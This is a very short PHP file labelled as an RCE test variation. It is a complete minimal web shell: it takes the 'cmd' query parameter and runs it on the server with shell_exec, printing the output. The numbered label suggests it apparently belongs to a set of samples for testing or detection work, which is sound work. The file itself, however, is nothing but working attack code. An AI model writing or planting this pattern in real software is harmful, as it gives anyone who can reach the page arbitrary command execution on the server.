<?php
// RCE test variation #1143
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>